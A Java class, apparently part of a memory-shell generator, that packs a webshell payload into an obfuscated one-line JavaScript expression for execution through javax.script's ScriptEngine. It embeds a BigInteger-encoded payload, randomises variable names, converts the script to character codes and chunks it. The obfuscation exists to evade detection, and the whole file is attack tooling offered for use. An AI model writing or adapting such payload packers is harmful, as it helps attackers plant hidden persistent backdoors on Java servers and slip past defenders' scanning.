package org.leo.jmg.mem.packer.scriptengine;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerCapability;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.PackerResources;
import org.leo.jmg.mem.packer.obfuscation.LiteralObfuscator;
import org.leo.jmg.mem.packer.obfuscation.PayloadObfuscator;

import java.util.Collections;

import static org.leo.jmg.mem.packer.scriptengine.DefaultScriptEnginePacker.scriptToSingleLine;

@PackerMeta(
        name = "ScriptEngineBigInteger",
        group = "ScriptEngine",
        order = 4,
        requiredCapabilities = PackerCapability.JAVASCRIPT_ENGINE,
        requiredClasses = "javax.script.ScriptEngineManager"
)
public class ScriptEngineBigIntegerPacker implements Packer {
    private final String jsTemplate = PackerResources.loadTemplate("/memshell-template/ScriptEngineBigInteger.js.txt");

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String bigIntegerStr = PackerRegistry.getOrThrow("BigInteger").pack(config);
        // TemplateRenderer 在渲染阶段完成变量名随机化（{{VAR:x}} 占位符）
        // bigIntegerStr 作为额外占位符传入（不经过 chunkPayload，base36 字符集已覆盖）
        String script = TemplateRenderer.render(jsTemplate, config,
                Collections.singletonMap("bigIntegerStr", bigIntegerStr));
        return scriptToSingleLine(PayloadObfuscator.chunk(
                LiteralObfuscator.javascriptCharCodes(script)));
    }
}
